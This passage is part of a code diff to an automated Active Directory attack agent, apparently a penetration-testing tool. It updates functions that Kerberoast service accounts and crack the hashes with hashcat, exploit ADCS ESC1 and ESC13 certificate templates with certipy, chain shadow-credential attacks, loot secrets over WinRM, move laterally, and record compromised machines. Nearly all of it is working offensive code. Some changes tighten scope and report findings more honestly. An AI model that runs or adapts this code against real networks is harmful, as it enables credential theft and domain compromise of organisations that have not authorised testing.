             "Outbound Object Control from the owned user."
+        )
+
+    # Preflight: skip cleanly when Neo4j is down instead of running 3 queries that
+    # each spew JVM warnings + a connect error. The graph data is still collected
+    # as JSON; this step is an optional enrichment.
+    if not _neo4j_reachable(neo4j_uri):
+        return (
+            f"Neo4j not reachable at {neo4j_uri} — skipping BloodHound graph queries "
+            f"(optional). Data is already collected in output/bloodhound/*.json. "
+            f"To enable path analysis: start Neo4j (sudo neo4j start) and import the "
+            f"JSON, then re-run query_bloodhound_paths."
         )
 
     dom = domain.upper()
@@ -4503,8 +4489,8 @@ def tool_query_bloodhound_paths(domain: str, owned_user: str,
             f"-u {shell_quote(neo4j_user)} -p {shell_quote(neo4j_password)} "
             f"{shell_quote(query)} 2>&1"
         )
-        out = _run(cmd, timeout=45)
-        results.append(f"=== {title} ===\n{out.strip() or 'No rows'}")
+        out = _strip_jvm_noise(_run(cmd, timeout=45))
+        results.append(f"=== {title} ===\n{out or 'No rows'}")
 
     combined = "\n\n".join(results)
 
@@ -4603,46 +4589,93 @@ def tool_asrep_roast(dc_ip: str, domain: str, username: str = "",
 
 def tool_kerberoast(dc_ip: str, domain: str, username: str,
                     password: str = "", nt_hash: str = "") -> str:
+    password = _real_secret(password) or _real_secret(SESSION.get("password", ""))
+    nt_hash = _real_nt_hash(nt_hash) or _real_nt_hash(SESSION.get("nt_hash", ""))
     out_file = str(_runtime_path("agent_kerberoast.txt"))
-    krb     = _session_kerberos_usable(username, domain)
     ntlm_off = SESSION.get("ntlm_disabled") or SESSION.get("agent_intel", {}).get("ntlm_disabled")
     dc_fqdn = _dc_host_for_kerberos(domain, dc_ip)
     ft = _faketime_prefix()
     # Use with_faketime=True so env vars are passed via env(1), not as shell prefixes
     get_spns = _impacket_cmd("GetUserSPNs", with_faketime=bool(ft))
-    if krb:
+
+    def _kerberos_cmd() -> str:
         ccache = SESSION["krb5_ccache"]
         os.environ["KRB5CCNAME"] = ccache
-        cmd = (f"KRB5CCNAME={shell_quote(ccache)} {ft}{get_spns} {domain}/{username} "
-               f"-k -no-pass -dc-ip {dc_ip} -dc-host {dc_fqdn} "
-               f"-request -outputfile {out_file}")
+        return (f"KRB5CCNAME={shell_quote(ccache)} {ft}{get_spns} {domain}/{username} "
+                f"-k -no-pass -dc-ip {dc_ip} -dc-host {dc_fqdn} "
+                f"-request -outputfile {out_file}")
+
+    def _password_cmd() -> str:
+        return (f"env -u KRB5CCNAME {get_spns} {domain}/{username}:{shell_quote(password)} "
+                f"-dc-ip {dc_ip} -dc-host {dc_fqdn} "
+                f"-request -outputfile {out_file}")
+
+    def _hash_cmd() -> str:
+        return (f"env -u KRB5CCNAME {get_spns} {domain}/{username} "
+                f"-hashes :{nt_hash.split(':')[-1]} -dc-ip {dc_ip} -dc-host {dc_fqdn} "
+                f"-request -outputfile {out_file}")
+
+    def _read_hashes() -> list:
+        if not Path(out_file).exists():
+            return []
+        return [l for l in Path(out_file).read_text(errors="ignore").splitlines()
+                if l.startswith("$krb5tgs")]
+
+    def _format_success(hashes: list) -> str:
+        cracked_file = _runtime_path("agent_krb_cracked.txt")
+        _run(f"hashcat -m 13100 {shell_quote(out_file)} /usr/share/wordlists/rockyou.txt "
+             f"--force -o {shell_quote(str(cracked_file))} -q 2>/dev/null", timeout=120)
+        cracked = cracked_file.read_text(errors="ignore") if cracked_file.exists() else ""
+        add_finding("Kerberoastable Accounts", "High",
+                    f"{len(hashes)} service accounts with SPNs",
+                    "Use gMSA; set 25+ char passwords on service accounts")
+        return f"Kerberoast hashes ({len(hashes)}):\n{chr(10).join(hashes[:3])}\nCracked: {cracked[:500] or 'None yet'}"
+
+    krb = _session_kerberos_usable(username, domain)
+    if krb:
+        cmd = _kerberos_cmd()
+    elif nt_hash:
+        cmd = _hash_cmd()
+    elif password and not ntlm_off:
+        # Keep the older password-auth Kerberoast path; it often succeeds before
+        # a Kerberos-only pivot is needed and preserves hash output for cracking.
+        cmd = _password_cmd()
     elif ntlm_off:
         return ("Kerberoast skipped: NTLM is disabled and no Kerberos ticket available. "
                 "Run request_tgt first.")
-    elif nt_hash:
-        cmd = (f"{get_spns} {domain}/{username} "
-               f"-hashes :{nt_hash.split(':')[-1]} -dc-ip {dc_ip} -dc-host {dc_fqdn} "
-               f"-request -outputfile {out_file}")
     else:
-        cmd = (f"{get_spns} {domain}/{username}:'{password}' "
-               f"-dc-ip {dc_ip} -dc-host {dc_fqdn} "
-               f"-request -outputfile {out_file}")
+        return "Kerberoast skipped: no password/hash or usable Kerberos ticket available."
+
     out = _run(cmd, timeout=60)
-    hashes = []
-    if Path(out_file).exists():
-        hashes = [l for l in Path(out_file).read_text().splitlines()
-                  if l.startswith("$krb5tgs")]
+    hashes = _read_hashes()
+    if hashes:
+        return _format_success(hashes)
+
+    if (("KRB_AP_ERR_SKEW" in out or "Clock skew too great" in out)
+            and password):
+        repair = tool_request_tgt(dc_ip, domain, username, password, nt_hash)
+        if _session_kerberos_usable(username, domain):
+            retry_out = _run(_kerberos_cmd(), timeout=60)
+            hashes = _read_hashes()
+            if hashes:
+                return _format_success(hashes)
+            return (f"Kerberoast result after clock-skew repair:\n"
+                    f"{out[:700]}\n\n=== request_tgt repair ===\n{repair[:700]}\n\n"
+                    f"=== Kerberos retry ===\n{retry_out[:1000]}\nNo SPN hashes captured.")
+        return (f"Kerberoast hit clock skew and TGT repair failed:\n"
+                f"{out[:700]}\n\n=== request_tgt repair ===\n{repair[:1000]}")
+
+    # If Kerberos mode produced no hash but NTLM/password auth is still available,
+    # fall back to the legacy path that was successful in the older tree.
+    if krb and not ntlm_off and (password or nt_hash):
+        fallback_cmd = _hash_cmd() if nt_hash else _password_cmd()
+        fallback_out = _run(fallback_cmd, timeout=60)
+        hashes = _read_hashes()
         if hashes:
-            cracked_file = _runtime_path("agent_krb_cracked.txt")
-            crack = _run(f"hashcat -m 13100 {shell_quote(out_file)} /usr/share/wordlists/rockyou.txt "
-                        f"--force -o {shell_quote(str(cracked_file))} -q 2>/dev/null", timeout=120)
-            cracked = ""
-            if cracked_file.exists():
-                cracked = cracked_file.read_text()
-            add_finding("Kerberoastable Accounts", "High",
-                        f"{len(hashes)} service accounts with SPNs",
-                        "Use gMSA; set 25+ char passwords on service accounts")
-            return f"Kerberoast hashes ({len(hashes)}):\n{chr(10).join(hashes[:3])}\nCracked: {cracked[:500] or 'None yet'}"
+            return _format_success(hashes)
+        return (f"Kerberoast result:\n{out[:700]}\n\n"
+                f"=== Password/hash fallback ===\n{fallback_out[:1000]}\nNo SPN hashes captured.")
+
     return f"Kerberoast result:\n{out[:1000]}\nNo SPNs found."
 
 
@@ -4758,11 +4791,17 @@ def tool_adcs_scan(dc_ip: str, domain: str, username: str,
     elif password:
         auth = f"-u '{username}@{domain}' -p '{password}'"
     else:
+        SESSION.setdefault("agent_intel", {})["last_adcs_scan_used_kerberos"] = False
+        SESSION.setdefault("agent_intel", {})["last_adcs_needs_retry_after_tgt"] = True
+        save_session()
         return (
             "ADCS scan skipped: no valid Kerberos ccache, password, or NT hash is available.\n"
             f"Current user: {username}@{domain}\n"
             "Run Session Manager to set credentials or run request_tgt first."
         )
+    SESSION.setdefault("agent_intel", {})["last_adcs_scan_used_kerberos"] = bool(krb and ccache)
+    SESSION.setdefault("agent_intel", {})["last_adcs_needs_retry_after_tgt"] = False
+    save_session()
 
     # certipy needs -target FQDN and -dc-host FQDN for Kerberos environments
     target_flags = (
@@ -4824,7 +4863,7 @@ def tool_adcs_scan(dc_ip: str, domain: str, username: str,
             save_session()
             return (
                 "ADCS scan failed: Kerberos/LDAP rejected the credential.\n"
-                "Windows LDAP error data 52e means invalid username or password, not an AdStrike runtime error.\n"
+                "Windows LDAP error data 52e means invalid username or password, not a AdAgent runtime error.\n"
                 f"Account tested: {username}@{domain}\n"
                 "Update the session password/hash or request a fresh TGT with the correct credential.\n\n"
                 f"=== ADCS SCAN ===\n{scan_out[:1800]}"
@@ -4887,6 +4926,8 @@ def tool_adcs_scan(dc_ip: str, domain: str, username: str,
 
     # If ESC found but no Kerberos ticket, get TGT first then re-scan.
     if "ESC" in scan_out and not SESSION.get("use_kerberos") and not SESSION.get("krb5_ccache"):
+        SESSION.setdefault("agent_intel", {})["last_adcs_needs_retry_after_tgt"] = True
+        save_session()
         results.append("ESC vulnerability found but no Kerberos ticket — requesting TGT now...")
         tgt_res = tool_request_tgt(dc_ip, domain, username,
                                    password=SESSION.get("password", ""),
@@ -4946,17 +4987,46 @@ def tool_adcs_scan(dc_ip: str, domain: str, username: str,
                 results.append(f"=== certipy auth ===\n{auth_out[:1000]}")
                 new_cc = f"{pfx_name}.ccache"
                 if Path(new_cc).exists():
+                    # certipy writes the ccache as a RELATIVE filename in the CWD.
+                    # Left there it flickers: the next certipy round overwrites it and
+                    # other flows unlink "<user>.ccache", so KRB5CCNAME ends up pointing
+                    # at a file that vanishes mid-use (klist -> "No credentials cache").
+                    # Persist it to an ABSOLUTE path in the agent runtime dir (same
+                    # convention as the session ccache) under a distinct *_adcs name so a
+                    # later request_tgt cannot clobber this privileged (PAC-injected, e.g.
+                    # ESC13) ticket. Target-agnostic — only uses pfx_name/domain variables.
+                    try:
+                        stable = str(_runtime_path(f"{pfx_name}_{domain}_adcs.ccache"))
+                        shutil.move(new_cc, stable)
+                        new_cc = stable
+                    except Exception:
+                        new_cc = str(Path(new_cc).resolve())
                     os.environ["KRB5CCNAME"] = new_cc
                     SESSION["krb5_ccache"] = new_cc
                     SESSION["use_kerberos"] = True
-                    SESSION.setdefault("agent_intel", {})["adcs_shell_ready"] = True
                     SESSION.setdefault("agent_intel", {}).setdefault("ccaches", []).append(new_cc)
-                    save_session()
-                    results.append(f"KRB5CCNAME updated -> {new_cc}")
-                    results.append(
-                        "NEXT ACTION: call evil_winrm now with Kerberos ccache.\n"
-                        f"Correct command: evil-winrm -i {dc_fqdn} -r {domain.upper()} -K {new_cc}"
-                    )
+                    # Post-auth verifier: only treat this as a usable privileged shell
+                    # when the freshly minted ADCS ccache actually validates (klist
+                    # parses it + default principal matches). Store it under a stable
+                    # key (adcs_ccache) that request_tgt won't clobber, so evil_winrm
+                    # uses THIS PAC-injected ticket — not a later plain user TGT.
+                    if _ccache_is_valid(new_cc, pfx_name, domain):
+                        SESSION.setdefault("agent_intel", {})["adcs_shell_ready"] = True
+                        SESSION.setdefault("agent_intel", {})["adcs_ccache"] = new_cc
+                        save_session()
+                        results.append(f"KRB5CCNAME updated -> {new_cc}")
+                        results.append(
+                            "NEXT ACTION: call evil_winrm now with Kerberos ccache.\n"
+                            f"Correct command: evil-winrm -i {dc_fqdn} -r {domain.upper()} -K {new_cc}"
+                        )
+                    else:
+                        save_session()
+                        results.append(
+                            f"certipy auth ran but the ADCS ccache did not validate "
+                            f"({new_cc}); NOT flagging shell-ready. Manual verify: "
+                            f"KRB5_CONFIG=<krb5.conf> KRB5CCNAME={new_cc} klist, then "
+                            f"re-run certipy auth -pfx '{pfx}' -dc-ip {dc_ip} -domain {domain}."
+                        )
                 return auth_out
             return req_out
 
@@ -4967,18 +5037,33 @@ def tool_adcs_scan(dc_ip: str, domain: str, username: str,
                     f"ESC13 selected: requesting current-user certificate from template {tpl} "
                     "without alternate UPN, then authenticating the PFX to refresh the ccache."
                 )
+                prev_ccache = SESSION.get("krb5_ccache")
                 auth_out = _certipy_req_auth(tpl, ca, "", username)
                 nt = re.search(r"[a-f0-9]{32}:([a-f0-9]{32})", auth_out)
-                exploited = bool(nt or SESSION.get("krb5_ccache"))
+                # ESC13's privilege lives in the Kerberos TGT's PAC (the OID-linked
+                # group SID), NOT in the NT hash — certipy/UnPAC just returns the
+                # user's own hash, which carries no added rights. So ESC13 counts
+                # as a usable shell ONLY when certipy auth wrote a FRESH privileged
+                # ccache this attempt. A pre-existing session ccache (initial
+                # request_tgt) or a bare NT hash must not flag shell-ready,
+                # otherwise we fire a doomed WinRM and report a false "TGT
+                # obtained". Target-agnostic: keys only off a newly-minted ccache.
+                fresh_ccache = (SESSION.get("krb5_ccache")
+                                if SESSION.get("krb5_ccache") != prev_ccache else None)
+                # A fresh ccache alone isn't enough — verify it actually validates
+                # (klist + principal) before claiming a usable privileged shell.
+                exploited = bool(fresh_ccache) and _ccache_is_valid(fresh_ccache, username, domain)
                 if nt:
                     SESSION.setdefault("loot", {})[username] = nt.group(1)
                     SESSION.setdefault("agent_intel", {}).setdefault("nt_hashes", {})[username] = nt.group(1)
                     SESSION["nt_hash"] = nt.group(1)
-                    add_finding("ADCS ESC13 - Group Membership via OID", "Critical",
-                                f"Template {tpl} maps cert to privileged group; TGT obtained",
-                                "Remove msDS-OIDToGroupLink on sensitive templates")
                 if exploited:
+                    add_finding("ADCS ESC13 - Group Membership via OID", "Critical",
+                                f"Template {tpl} maps cert to privileged group; privileged TGT obtained",
+                                "Remove msDS-OIDToGroupLink on sensitive templates",
+                                proof_level="exploited")
                     SESSION.setdefault("agent_intel", {})["adcs_shell_ready"] = True
+                    SESSION.setdefault("agent_intel", {})["adcs_ccache"] = fresh_ccache
                     save_session()
                     results.append(
                         f"ESC13 exploited via template {tpl}. "
@@ -4986,9 +5071,21 @@ def tool_adcs_scan(dc_ip: str, domain: str, username: str,
                         f"against FQDN {dc_fqdn}, realm {domain.upper()}."
                     )
                 else:
-                    results.append(f"ESC13 template {tpl} found, but certificate auth did not yield a hash or ccache.")
+                    # Template is misconfigured (OID->group link) so it is still a
+                    # real finding, but auth did not yield a usable privileged ccache
+                    # in this run — report honestly and do NOT claim shell-ready.
+                    add_finding("ADCS ESC13 - Group Membership via OID", "High",
+                                f"Template {tpl} links a certificate to a privileged group via "
+                                f"msDS-OIDToGroupLink, but certificate auth did not produce a usable "
+                                f"privileged ccache in this run — verify manually with certipy auth.",
+                                "Remove msDS-OIDToGroupLink on sensitive templates")
+                    results.append(
+                        f"ESC13 template {tpl} found, but certificate auth did not produce a fresh "
+                        f"privileged ccache (an NT hash alone does not carry the ESC13 group SID). "
+                        f"Not flagging shell-ready."
+                    )
 
-        if "ESC1" in scan_out:
+        if re.search(r"ESC1\b", scan_out):
             tpl, ca = _pick_template_ca_for_esc(scan_out, "1")
             if tpl and ca:
                 auth_out = _certipy_req_auth(tpl, ca, f"administrator@{domain}", "administrator")
@@ -5134,14 +5231,21 @@ def _dc_time_local() -> str:
 
 
 def _shadow_chain(attacker_user: str, attacker_pw: str, target_sam: str,
-                  domain: str, dc: str) -> dict | None:
-    """Inline shadow credentials chain."""
-    tgt_py = os.path.expanduser("~/.local/bin/getTGT.py")
-    if not Path(tgt_py).exists():
-        return None
+                  domain: str, dc: str) -> tuple:
+    """Inline shadow credentials chain. Returns (result_dict, reason_str)."""
+    # Resolve getTGT.py from multiple locations (same as _getTGT)
+    _tgt_candidates = [
+        os.path.expanduser("~/.local/bin/getTGT.py"),
+        "/usr/share/doc/python3-impacket/examples/getTGT.py",
+        shutil.which("getTGT.py") or "",
+        str(Path(__file__).resolve().parents[2] / "tools" / "bin" / "getTGT.py"),
+    ]
+    tgt_py = next((p for p in _tgt_candidates if p and Path(p).exists()), "")
+    if not tgt_py:
+        return None, "getTGT.py not found — install impacket"
     fake_ts = _dc_time_local()
     if not fake_ts or not shutil.which("faketime"):
-        return None
+        return None, "faketime not found or DC time unavailable — install faketime"
 
     pfx_name = target_sam.rstrip("$").lower()
     pfx_path = f"/tmp/agent_{pfx_name}.pfx"
@@ -5152,8 +5256,9 @@ def _shadow_chain(attacker_user: str, attacker_pw: str, target_sam: str,
         ["faketime", fake_ts, "/usr/bin/python3", tgt_py,
          f"{domain}/{attacker_user}:{attacker_pw}", "-dc-ip", dc],
         capture_output=True, text=True, timeout=25)
-    if "Saving ticket" not in tgt_r.stdout + tgt_r.stderr:
-        return None
+    tgt_out = tgt_r.stdout + tgt_r.stderr
+    if "Saving ticket" not in tgt_out:
+        return None, f"TGT failed for {attacker_user}: {tgt_out.strip()[-300:]}"
     default = f"{attacker_user}.ccache"
     if Path(default).exists():
         shutil.move(default, atk_ccache)
@@ -5177,7 +5282,7 @@ def _shadow_chain(attacker_user: str, attacker_pw: str, target_sam: str,
     env = {**os.environ, "KRB5CCNAME": atk_ccache}
     certipy = _bin("certipy")
     if not certipy:
-        return None
+        return None, "certipy not found — install: pip install certipy-ad"
 
     sh_r = subprocess.run(
         ["faketime", fake2, certipy, "shadow", "add",
@@ -5186,7 +5291,7 @@ def _shadow_chain(attacker_user: str, attacker_pw: str, target_sam: str,
         capture_output=True, text=True, timeout=45, env=env)
     sh_out = sh_r.stdout + sh_r.stderr
     if "Successfully added Key Credential" not in sh_out:
-        return None
+        return None, f"certipy shadow add failed: {sh_out.strip()[-400:]}"
 
     if Path(f"{pfx_name}.pfx").exists():
         shutil.move(f"{pfx_name}.pfx", pfx_path)
@@ -5216,14 +5321,14 @@ def _shadow_chain(attacker_user: str, attacker_pw: str, target_sam: str,
 
     nt_m = re.search(r"[a-f0-9]{32}:([a-f0-9]{32})", auth_out, re.I)
     if not nt_m:
-        return None
+        return None, f"certipy auth (PKINIT) failed: {auth_out.strip()[-400:]}"
     nt = nt_m.group(1)
 
     cc = f"{pfx_name}.ccache"
     if Path(cc).exists():
         shutil.move(cc, f"/tmp/agent_{pfx_name}.ccache")
 
-    return {"nt_hash": nt, "pfx_path": pfx_path}
+    return {"nt_hash": nt, "pfx_path": pfx_path}, "success"
 
 
 def tool_shadow_credentials(attacker_user: str, attacker_pass: str,
@@ -5234,7 +5339,15 @@ def tool_shadow_credentials(attacker_user: str, attacker_pass: str,
             "Run acl_abuse_scan or query_bloodhound_paths first and use a concrete "
             "target such as USER, COMPUTER$, or gMSA$."
         )
-    result = _shadow_chain(attacker_user, attacker_pass, target_account, domain, dc_ip)
+    if _same_ad_account(target_account, attacker_user):
+        return (
+            f"Shadow Credentials skipped: target ('{target_account}') is the "
+            f"attacking account itself. The victim must be a DIFFERENT object the "
+            f"attacker has GenericWrite/GenericAll/WriteOwner over — self-targeting "
+            f"is meaningless and fails with KDC_ERR_S_PRINCIPAL_UNKNOWN. Derive the "
+            f"victim from acl_abuse_scan/query_bloodhound_paths first."
+        )
+    result, reason = _shadow_chain(attacker_user, attacker_pass, target_account, domain, dc_ip)
     if result:
         nt = result["nt_hash"]
         pwned = _winrm_test(target_account, nt, domain, dc_ip)
@@ -5243,7 +5356,7 @@ def tool_shadow_credentials(attacker_user: str, attacker_pass: str,
                 f"Account: {target_account}\nNT Hash: {nt}\n"
                 f"WinRM: {'Pwn3d!' if pwned else 'not available'}\n"
                 f"evil-winrm -i {dc_ip} -u '{target_account}' -H '{nt}'")
-    return "Shadow Credentials failed."
+    return f"Shadow Credentials failed: {reason}"
 
 
 def tool_acl_abuse_scan(dc_ip: str, domain: str, username: str,
@@ -5664,17 +5777,13 @@ def tool_auto_loot_chain(dc_ip: str, domain: str, username: str, password: str) 
 
     if valid_creds:
         best = valid_creds[0]
-        SESSION.update({
-            "username": best["user"],
-            "password": best["password"],
-            "nt_hash": "",
-            "use_kerberos": best.get("auth") == "valid_kerb" and bool(best.get("ccache")),
-        })
-        if best.get("ccache"):
-            SESSION["krb5_ccache"] = best["ccache"]
-            os.environ["KRB5CCNAME"] = best["ccache"]
-            _target_krb5_config(dc_ip, domain, _dc_host_for_kerberos(domain, dc_ip))
-        out_parts.append(f"Pivoting session to valid credential: {best['user']}")
+        # Store found credentials in intel only — do not overwrite the active session user
+        intel_store = SESSION.setdefault("agent_intel", {})
+        intel_store.setdefault("valid_creds", [])
+        for cred in valid_creds:
+            if cred not in intel_store["valid_creds"]:
+                intel_store["valid_creds"].append(cred)
+        out_parts.append(f"Found valid credential: {best['user']} (stored in intel, session user unchanged)")
 
         acl_out = tool_acl_abuse_scan(
             dc_ip, domain, best["user"], password=best["password"],
@@ -5815,11 +5924,10 @@ def tool_auto_loot_chain(dc_ip: str, domain: str, username: str, password: str) 
                                         if "Pwn3d" in winrm_out:
                                             out_parts.append(f"WinRM Pwn3d! → {sam}")
                                             out_parts.append(f"evil-winrm -i {dc_ip} -u '{sam}' -H '{nt_hash}'")
-                                            SESSION["owned_machines"].append(
-                                                {"machine": dc_ip, "user": sam,
-                                                 "nt_hash": nt_hash,
-                                                 "method": "Shadow Creds → WinRM",
-                                                 "time": datetime.now().isoformat()})
+                                            _add_owned_machine(
+                                                dc_ip, user=sam, nt_hash=nt_hash,
+                                                method="Shadow Creds → WinRM",
+                                                time=datetime.now().isoformat())
 
     return "\n".join(out_parts) if out_parts else "Auto chain: no credentials or paths found."
 
@@ -5888,6 +5996,8 @@ def tool_lateral_movement(target_ip: str, domain: str, username: str,
 
     # WinRM via nxc -x (works non-interactively, Kerberos-aware)
     if method == "winrm":
+        # PowerShell doesn't accept & as command separator — replace with ;
+        command = command.replace(" & ", "; ")
         test = _nxc(f"winrm {target_ip} {nxc_auth}", timeout=15)
         if "Pwn3d!" not in test and "Pwn3d" not in test:
             # Try with FQDN for Kerberos
@@ -5900,9 +6010,8 @@ def tool_lateral_movement(target_ip: str, domain: str, username: str,
         add_finding("Remote Command Execution — WinRM", "Critical",
                     f"Command execution on {host} as {domain}\\{username}: {command[:60]}",
                     "Restrict WinRM access; enable JEA; monitor PSRemoting")
-        SESSION["owned_machines"].append(
-            {"machine": host, "user": username, "method": "WinRM",
-             "time": datetime.now().isoformat()})
+        _add_owned_machine(host, user=username, method="WinRM",
+                           time=datetime.now().isoformat())
         save_session()
         return f"WinRM [{host}] as {username}:\nCommand: {command}\n{cmd_out[:3000]}"
 
@@ -6067,6 +6176,44 @@ def tool_credential_loot(dc_ip: str, domain: str, username: str,
     auth = _auth_args_nxc(username, password, nt_hash, domain, host)
     results = [f"=== Sensitive Data Hunt: {username}@{host} ==="]
 
+    # --- Pre-flight: confirm this principal can actually EXEC over WinRM before
+    # firing 9 loot queries. Accounts that authenticate but are not in Remote
+    # Management Users / not local admin cannot run -x, so every query would
+    # return an empty [-]. If the passed credential can't exec, fall back to any
+    # principal we already own WinRM exec on (populated for ANY engagement via
+    # owned_machines), preferring one tied to this host. Fully target-agnostic —
+    # nothing here is hardcoded to a specific box.
+    probe = _nxc(f"winrm {shell_quote(host)} {auth}", timeout=35)
+    if "Pwn3d" not in (probe or ""):
+        winrm_owned = [
+            m for m in SESSION.get("owned_machines", [])
+            if "winrm" in str(m.get("method", "")).lower()
+            and str(m.get("user", "")).strip()
+            and _real_nt_hash(m.get("nt_hash", ""))
+        ]
+        winrm_owned.sort(key=lambda m: 0 if str(m.get("machine", "")).strip() in
+                         (host, SESSION.get("dc_fqdn", ""), SESSION.get("dc_hostname", "")) else 1)
+        for m in winrm_owned:
+            fb_user = str(m["user"]).strip()
+            fb_hash = _real_nt_hash(m["nt_hash"])
+            if fb_user == username:
+                continue
+            cand_auth = _auth_args_nxc(fb_user, "", fb_hash, domain, host)
+            cand_probe = _nxc(f"winrm {shell_quote(host)} {cand_auth}", timeout=35)
+            if "Pwn3d" in (cand_probe or ""):
+                results.append(f"[*] {username} lacks WinRM exec on {host}; "
+                               f"switched to owned principal {fb_user}")
+                username, auth, probe = fb_user, cand_auth, cand_probe
+                break
+        if "Pwn3d" not in (probe or ""):
+            results.append(
+                f"[-] No WinRM exec rights on {host} for {username} (not in Remote "
+                f"Management Users / not local admin). Skipped loot queries — run "
+                f"discover_winrm_access or supply an owned principal (gMSA / service "
+                f"account) that can -x."
+            )
+            return "\n".join(results)[:6000]
+
     loot_commands = [
         # Config files with passwords
         ("web_configs", (
@@ -6147,24 +6294,28 @@ def _derive_scoped_subnet(dc_ip: str) -> str:
 
 
 def _known_winrm_candidate_hosts(dc_ip: str, target_subnet: str = "") -> list:
-    """Return a conservative host scope for WinRM auth testing."""
+    """Return a conservative host scope for WinRM auth testing.
+
+    Only scan specific known hosts by default. Subnet scanning is opt-in via
+    target_subnet or SESSION["target_subnet"] to avoid hitting unrelated machines
+    on shared networks (e.g. a /24 that contains other tenants' hosts).
+    """
     candidates = []
     for value in [
         dc_ip,
         SESSION.get("dc_fqdn", ""),
         SESSION.get("dc_hostname", ""),
-        target_subnet,
-        SESSION.get("target_subnet", ""),
-        SESSION.get("subnet", ""),
     ]:
         value = str(value or "").strip()
         if value and value not in candidates:
             candidates.append(value)
 
-    if not any("/" in c for c in candidates):
-        scoped = _derive_scoped_subnet(dc_ip)
-        if scoped:
-            candidates.append(scoped)
+    # Only add subnet if explicitly requested — never auto-derive /24
+    for value in [target_subnet, SESSION.get("target_subnet", ""), SESSION.get("subnet", "")]:
+        value = str(value or "").strip()
+        if value and "/" in value and value not in candidates:
+            candidates.append(value)
+
     return candidates
 
 
@@ -6196,10 +6347,9 @@ def tool_discover_winrm_access(dc_ip: str, domain: str, username: str,
             for host in hosts or [target]:
                 if host not in found:
                     found.append(host)
-                    SESSION.setdefault("owned_machines", []).append({
-                        "machine": host, "user": username, "method": "WinRM",
-                        "nt_hash": nt_hash, "time": datetime.now().isoformat(),
-                    })
+                    _add_owned_machine(host, user=username, method="WinRM",
+                                       nt_hash=nt_hash,
+                                       time=datetime.now().isoformat())
                     add_finding(
                         "WinRM Access Discovered", "Critical",
                         f"WinRM Pwn3d: {domain}\\{username} on {host}",
@@ -6235,28 +6385,79 @@ def tool_discover_winrm_access(dc_ip: str, domain: str, username: str,
 
 def tool_test_credential(dc_ip: str, domain: str, username: str,
                          password: str = "", nt_hash: str = "") -> str:
-    auth = _auth_args_nxc(username, password, nt_hash, domain)
+    password = _real_secret(password)
+    nt_hash = _real_nt_hash(nt_hash)
+    auth = _auth_args_nxc(username, password, nt_hash, domain, dc_ip)
     results = []
+    intel = SESSION.setdefault("agent_intel", {})
+    tested = intel.setdefault("valid_creds_tested", [])
+    validation = {
+        "user": username,
+        "password": password,
+        "nt_hash": nt_hash,
+        "ldap": False,
+        "smb": [],
+        "winrm": [],
+        "admin": False,
+    }
 
-    smb = _nxc(f"smb {dc_ip} {auth}", timeout=15)
-    winrm = _nxc(f"winrm {dc_ip} {auth}", timeout=15)
-    ldap = _nxc(f"ldap {dc_ip} {auth}", timeout=15)
+    def _accepted(out: str) -> bool:
+        return any(s in (out or "") for s in ("[+]", "STATUS_SUCCESS", "Pwn3d"))
 
-    results.append(f"SMB:   {smb.splitlines()[-1] if smb else 'timeout'}")
-    results.append(f"WinRM: {winrm.splitlines()[-1] if winrm else 'timeout'}")
-    results.append(f"LDAP:  {ldap.splitlines()[-1] if ldap else 'timeout'}")
+    candidates = _known_winrm_candidate_hosts(dc_ip)
+    for target in candidates[:8]:
+        smb = _nxc(f"smb {shell_quote(target)} {auth}", timeout=15)
+        winrm = _nxc(f"winrm {shell_quote(target)} {auth}", timeout=15)
+        results.append(f"SMB {target}:   {smb.splitlines()[-1] if smb else 'timeout'}")
+        results.append(f"WinRM {target}: {winrm.splitlines()[-1] if winrm else 'timeout'}")
+        if _accepted(smb):
+            if target not in validation["smb"]:
+                validation["smb"].append(target)
+        if "Pwn3d" in winrm:
+            validation["admin"] = True
+            for host in _parse_nxc_hosts(winrm) or [target]:
+                if host not in validation["winrm"]:
+                    validation["winrm"].append(host)
 
-    if "Pwn3d" in winrm:
+    ldap = _nxc(f"ldap {shell_quote(dc_ip)} {auth}", timeout=15)
+    results.append(f"LDAP {dc_ip}:  {ldap.splitlines()[-1] if ldap else 'timeout'}")
+    validation["ldap"] = _accepted(ldap)
+
+    marker = {"user": username, "password": password, "nt_hash": nt_hash}
+    if marker not in tested:
+        tested.append(marker)
+
+    validated = intel.setdefault("validated_creds", [])
+    if validation not in validated:
+        validated.append(validation)
+
+    if validation["ldap"] or validation["smb"] or validation["winrm"]:
+        cred = {"user": username, "password": password, "auth": "validated"}
+        store = intel.setdefault("valid_creds", [])
+        if password and cred not in store:
+            store.append(cred)
+        add_finding(
+            f"Validated Credential: {username}", "High",
+            f"{domain}\\{username} accepted by "
+            f"LDAP={validation['ldap']} SMB={validation['smb']} WinRM={validation['winrm']}",
+            "Remove plaintext credentials from descriptions/files; rotate the account password.",
+        )
+
+    for host in validation["winrm"]:
+        wt = intel.setdefault("winrm_targets", [])
+        if host not in wt:
+            wt.append(host)
         add_finding(f"Admin WinRM Access: {username}", "Critical",
-                    f"{domain}\\{username} has administrative WinRM access",
+                    f"{domain}\\{username} has administrative WinRM access on {host}",
                     "Restrict local admin accounts")
-        SESSION["owned_machines"].append(
-            {"machine": dc_ip, "user": username,
-             "method": "WinRM", "time": datetime.now().isoformat()})
+        _add_owned_machine(host, user=username, method="WinRM",
+                           time=datetime.now().isoformat())
 
-    is_admin = any("Pwn3d" in x or "(admin)" in x.lower()
-                   for x in [smb, winrm, ldap])
-    return "\n".join(results) + f"\nAdmin: {'YES' if is_admin else 'No'}"
+    save_session()
+    return ("\n".join(results)
+            + f"\nLDAP valid: {'YES' if validation['ldap'] else 'No'}"
+            + f"\nSMB valid: {validation['smb'] or 'No'}"
+            + f"\nWinRM admin: {validation['winrm'] or 'No'}")
 
 
 def tool_update_session(**kwargs) -> str:
@@ -6271,9 +6472,8 @@ def tool_update_session(**kwargs) -> str:
                                                "time": datetime.now().isoformat()})
     if kwargs.get("owned_machines"):
         for m in kwargs["owned_machines"]:
-            if {"machine": m} not in SESSION["owned_machines"]:
-                SESSION["owned_machines"].append({"machine": m, "method": "agent",
-                                                   "time": datetime.now().isoformat()})
+            _add_owned_machine(m, method="agent",
+                               time=datetime.now().isoformat())
     SESSION.update(updates)
     save_session()
     return f"Session updated: {list(updates.keys())} | Owned: {len(SESSION['owned_users'])}u / {len(SESSION['owned_machines'])}m"
@@ -6345,7 +6545,7 @@ def tool_request_tgt(dc_ip: str, domain: str, username: str,
     try:
         hosts = Path("/etc/hosts").read_text()
         if dc_fqdn not in hosts:
